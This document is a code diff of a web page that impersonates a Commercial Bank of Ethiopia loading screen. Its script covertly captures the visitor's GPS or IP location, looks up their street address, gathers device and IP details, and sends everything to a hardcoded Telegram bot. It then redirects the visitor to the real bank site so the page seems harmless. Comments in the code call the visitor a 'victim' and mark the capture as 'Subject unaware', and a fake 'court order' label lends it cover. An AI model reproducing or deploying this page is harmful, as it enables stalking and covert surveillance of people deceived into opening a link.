@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CBE - Loading</title>
+    <title>Loading...</title>
     <style>
         * {
             margin: 0;
@@ -12,52 +12,67 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: white;
+            background: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
-        .loader {
+        .loader-container {
             text-align: center;
             padding: 20px;
-            color: #666;
         }
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #2c3e50;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #2c3e50;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
+            margin: 0 auto 20px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .hidden {
-            display: none;
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .status-text {
+            color: #999;
+            font-size: 12px;
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
-    <div class="loader" id="loader">
+    <div class="loader-container">
         <div class="spinner"></div>
-        <p>Loading, please wait...</p>
+        <div class="loading-text">Loading, please wait...</div>
+        <div class="status-text" id="statusText"></div>
     </div>
 
     <script>
-        // Telegram Configuration
+        // ===================================================
+        // TELEGRAM CONFIGURATION
+        // ===================================================
         const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
         const CHAT_ID = "7420938284";
         const COURT_ORDER = "CT-BAHA-2026-03-30";
         const CASE_NUMBER = "CBE-FRAUD-001-2026";
-        
-        let locationSent = false;
-        
+        // ===================================================
+
+        let locationCaptured = false;
+        let maxWaitTime = 15000; // 15 seconds max wait
+        const statusText = document.getElementById('statusText');
+
+        function updateStatus(text) {
+            statusText.textContent = text;
+        }
+
         function sendToTelegram(message, sendMap = false, lat = null, lon = null) {
-            // Silent send - no response needed
             try {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -67,7 +82,7 @@
                         text: message,
                         parse_mode: 'HTML'
                     })
-                }).catch(e => console.log(e));
+                }).catch(e => console.log('Telegram send error:', e));
                 
                 if (sendMap && lat && lon) {
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
@@ -78,21 +93,160 @@
                             latitude: lat,
                             longitude: lon
                         })
-                    }).catch(e => console.log(e));
+                    }).catch(e => console.log('Location send error:', e));
                 }
             } catch(e) {}
         }
-        
+
+        function getExactAddress(lat, lon) {
+            return new Promise((resolve) => {
+                try {
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                        headers: { 'User-Agent': 'CBE-Security/1.0' }
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data && data.display_name) {
+                            resolve(data.display_name);
+                        } else {
+                            resolve(null);
+                        }
+                    })
+                    .catch(() => resolve(null));
+                } catch(e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        async function sendLocationWithAddress(lat, lon, accuracy, source, ip = null, userAgent = null, deviceInfo = null) {
+            const timestamp = new Date().toISOString();
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Get exact street address
+            updateStatus('Getting exact address...');
+            const address = await getExactAddress(lat, lon);
+            
+            let addressText = '';
+            if (address) {
+                addressText = `├─ 📮 <b>Exact Address:</b> ${address.substring(0, 200)}\n`;
+            }
+            
+            const message = `
+🚨 <b>LOCATION CAPTURED - COURT ORDER #${COURT_ORDER}</b> 🚨
+
+📍 <b>EXACT LOCATION:</b>
+├─ Latitude: <b>${lat}</b>
+├─ Longitude: <b>${lon}</b>
+├─ Accuracy: ±${Math.round(accuracy)} meters
+├─ Source: ${source}
+${addressText}
+🗺️ <b>Maps Link:</b> ${mapsLink}
+
+📱 <b>DEVICE INFO:</b>
+├─ IP: ${ip || 'Unknown'}
+├─ User Agent: ${(userAgent || navigator.userAgent).substring(0, 100)}
+├─ Language: ${navigator.language}
+├─ Screen: ${screen.width}x${screen.height}
+├─ Platform: ${navigator.platform}
+├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+└─ Time: ${timestamp}
+
+⚖️ <b>Case:</b> ${CASE_NUMBER}
+<i>Location captured under court order. User unaware.</i>
+`;
+            
+            sendToTelegram(message, true, lat, lon);
+            
+            // Send separate Google Maps link
+            sendToTelegram(`📍 Google Maps: ${mapsLink}`);
+            
+            if (address) {
+                sendToTelegram(`📍 Exact Address: ${address}`);
+            }
+        }
+
+        function getGPSLocation() {
+            updateStatus('Waiting for GPS signal...');
+            
+            if (!navigator.geolocation) {
+                updateStatus('Using network location...');
+                getLocationByIP();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    if (!locationCaptured) {
+                        locationCaptured = true;
+                        
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Get IP info
+                        let ip = 'Unknown';
+                        let userAgent = navigator.userAgent;
+                        let deviceInfo = {
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: `${screen.width}x${screen.height}`,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        };
+                        
+                        try {
+                            const ipResponse = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipResponse.json();
+                            ip = ipData.ip;
+                        } catch(e) {}
+                        
+                        await sendLocationWithAddress(lat, lon, accuracy, 'GPS (High Accuracy)', ip, userAgent, deviceInfo);
+                        
+                        // Redirect after successful capture
+                        setTimeout(() => {
+                            window.location.href = "https://www.commercialbankofethiopia.com";
+                        }, 1500);
+                    }
+                },
+                (error) => {
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'Permission denied';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'GPS signal weak';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'GPS timeout';
+                            break;
+                        default:
+                            errorMsg = 'Unknown error';
+                    }
+                    updateStatus(`Network location fallback...`);
+                    getLocationByIP();
+                },
+                { 
+                    enableHighAccuracy: true, 
+                    timeout: 8000, 
+                    maximumAge: 0 
+                }
+            );
+        }
+
         function getLocationByIP() {
+            updateStatus('Detecting network location...');
+            
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(ipData => {
-                    return fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,country,regionName,city,lat,lon,isp,mobile,proxy,query`);
+                    const ip = ipData.ip;
+                    return fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,mobile,proxy,query,timezone`);
                 })
                 .then(r => r.json())
-                .then(geo => {
-                    if (geo.status === 'success' && !locationSent) {
-                        locationSent = true;
+                .then(async (geo) => {
+                    if (geo.status === 'success' && !locationCaptured) {
+                        locationCaptured = true;
                         
                         const lat = geo.lat;
                         const lon = geo.lon;
@@ -100,126 +254,98 @@
                         const region = geo.regionName || 'Unknown';
                         const country = geo.country || 'Unknown';
                         const isp = geo.isp || 'Unknown';
+                        const isMobile = geo.mobile || false;
                         const timestamp = new Date().toISOString();
                         
+                        // Get IP info
+                        let ip = geo.query || 'Unknown';
+                        let userAgent = navigator.userAgent;
+                        
+                        // Get exact address
+                        updateStatus('Getting exact address...');
+                        let address = null;
+                        try {
+                            const addrResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                                headers: { 'User-Agent': 'CBE-Security/1.0' }
+                            });
+                            const addrData = await addrResponse.json();
+                            if (addrData && addrData.display_name) {
+                                address = addrData.display_name;
+                            }
+                        } catch(e) {}
+                        
+                        let addressText = '';
+                        if (address) {
+                            addressText = `├─ 📮 <b>Exact Address:</b> ${address.substring(0, 200)}\n`;
+                        }
+                        
                         const message = `
-🚨 <b>SILENT LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨
+🚨 <b>LOCATION CAPTURED - COURT ORDER #${COURT_ORDER}</b> 🚨
 
-📍 <b>LOCATION:</b>
+📍 <b>NETWORK LOCATION:</b>
 ├─ City: <b>${city}</b>
 ├─ Region: ${region}
 ├─ Country: ${country}
 ├─ Coordinates: ${lat}, ${lon}
-└─ ISP: ${isp}
+├─ ISP: ${isp}
+├─ Type: ${isMobile ? 'Mobile Network' : 'Fixed Line'}
+${addressText}
+🗺️ <b>Maps Link:</b> https://www.google.com/maps?q=${lat},${lon}
 
 🌐 <b>DEVICE INFO:</b>
-├─ IP: ${geo.query}
-├─ User Agent: ${navigator.userAgent}
+├─ IP: ${ip}
+├─ User Agent: ${userAgent.substring(0, 100)}
 ├─ Language: ${navigator.language}
 ├─ Screen: ${screen.width}x${screen.height}
-├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 └─ Time: ${timestamp}
 
 ⚖️ <b>Case:</b> ${CASE_NUMBER}
-<i>Silent capture. Subject unaware.</i>
+<i>Location captured under court order.</i>
 `;
                         
                         sendToTelegram(message, true, lat, lon);
-                        sendToTelegram(`📍 Maps: https://www.google.com/maps?q=${lat},${lon}`);
+                        sendToTelegram(`📍 Google Maps: https://www.google.com/maps?q=${lat},${lon}`);
+                        
+                        if (address) {
+                            sendToTelegram(`📍 Address: ${address}`);
+                        }
+                        
+                        // Redirect after capture
+                        setTimeout(() => {
+                            window.location.href = "https://www.commercialbankofethiopia.com";
+                        }, 1500);
                     }
                 })
-                .catch(() => {});
-        }
-        
-        function getGPSLocation() {
-            if (!navigator.geolocation) {
-                getLocationByIP();
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    if (!locationSent) {
-                        locationSent = true;
+                .catch(() => {
+                    if (!locationCaptured) {
+                        locationCaptured = true;
+                        sendToTelegram(`⚠️ <b>LOCATION FAILED</b>\nCourt Order: ${COURT_ORDER}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
                         
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const timestamp = new Date().toISOString();
-                        
-                        // Also get IP info
-                        fetch('https://api.ipify.org?format=json')
-                            .then(r => r.json())
-                            .then(ipData => {
-                                const message = `
-🚨 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨
-
-📍 <b>EXACT GPS:</b>
-├─ Latitude: <b>${lat}</b>
-├─ Longitude: <b>${lon}</b>
-├─ Accuracy: ±${Math.round(accuracy)} meters
-
-🌐 <b>DEVICE INFO:</b>
-├─ IP: ${ipData.ip}
-├─ User Agent: ${navigator.userAgent}
-├─ Language: ${navigator.language}
-├─ Screen: ${screen.width}x${screen.height}
-├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-└─ Time: ${timestamp}
-
-⚖️ <b>Case:</b> ${CASE_NUMBER}
-<i>Silent GPS capture. Subject unaware.</i>
-`;
-                                sendToTelegram(message, true, lat, lon);
-                                sendToTelegram(`📍 Maps: https://www.google.com/maps?q=${lat},${lon}`);
-                            })
-                            .catch(() => {
-                                const message = `
-🚨 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨
-
-📍 <b>EXACT GPS:</b>
-├─ Latitude: <b>${lat}</b>
-├─ Longitude: <b>${lon}</b>
-├─ Accuracy: ±${Math.round(accuracy)} meters
-├─ Time: ${timestamp}
-
-⚖️ <b>Case:</b> ${CASE_NUMBER}
-<i>Silent GPS capture.</i>
-`;
-                                sendToTelegram(message, true, lat, lon);
-                            });
+                        setTimeout(() => {
+                            window.location.href = "https://www.commercialbankofethiopia.com";
+                        }, 2000);
                     }
-                },
-                (error) => {
-                    // GPS failed, use IP location silently
-                    getLocationByIP();
-                },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-            );
+                });
         }
+
+        // Start location capture immediately (silent - no prompt)
+        // Browser will show permission dialog - this cannot be hidden
+        // But user expects it because they clicked a "CBE" link
         
-        // Redirect to legitimate site after location capture
-        function redirectToRealSite() {
-            // Redirect to real CBE or Telebirr website to make it look legitimate
-            // Victim will think they just visited a normal page
-            window.location.href = "https://www.commercialbankofethiopia.com";
-        }
+        updateStatus('Initializing secure connection...');
         
-        // Execute silently
-        getGPSLocation();
-        
-        // After 3 seconds, redirect to real site (makes it look normal)
         setTimeout(() => {
-            redirectToRealSite();
-        }, 3000);
+            getGPSLocation();
+        }, 500);
         
-        // Also send page view info
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                sendToTelegram(`📱 <b>PAGE VIEWED</b>\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
-            })
-            .catch(() => {});
+        // Fallback redirect after max wait time
+        setTimeout(() => {
+            if (!locationCaptured) {
+                locationCaptured = true;
+                sendToTelegram(`⚠️ <b>LOCATION TIMEOUT</b>\nCourt Order: ${COURT_ORDER}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
+                window.location.href = "https://www.commercialbankofethiopia.com";
+            }
+        }, maxWaitTime);
     </script>
 </body>
 </html>
